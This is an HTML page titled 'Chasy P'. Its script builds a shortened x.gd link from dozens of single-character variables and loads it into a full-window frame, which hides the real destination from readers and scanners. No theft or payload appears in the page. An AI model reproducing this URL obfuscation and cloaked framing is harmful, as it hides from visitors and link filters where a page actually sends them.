<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chasy P</title>
<link rel="icon" type="image/png" sizes="240x240" href="/favicon-light.png" media="(prefers-color-scheme: light)">
<link rel="icon" type="image/png" sizes="240x240" href="/favicon-dark.png" media="(prefers-color-scheme: dark)">

    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        fencedframe, iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <fencedframe id="frame" title="Chasy P"></fencedframe>

    <script>
        const h = "h";
        const t = "t";
        const t2 = "t";
        const p = "p";
        const s = "s";
        const colon = ":";
        const slash = "/";
        const slash2 = "/";

        const e = "x";
        const x = ".";
        const a = "g";
        const m = "d";
        const p2 = "/";
        const l = "C";
        const e2 = "h";
        const dot = "a";
        const c = "s";
        const o = "y";
        const m2 = "_";
        const add = "P"
        const cc = "_"

        const url =
            h + t + t2 + p + s + colon + slash + slash2 +   
            e + x + a + m + p2 + l + e2 +                    
            dot +                                           
            c + o + m2 + add + cc;

        (function loadFrame() {
            const frame = document.getElementById("frame");

            if (window.FencedFrameConfig) {
                try {
                    frame.config = new FencedFrameConfig(url);
                    return;
                } catch (err) {
                }
            }

            const fallback = document.createElement("iframe");
            fallback.src = url;
            fallback.title = "Chasy P";
            frame.replaceWith(fallback);
        })();
    </script>
</body>
</html>

</body>
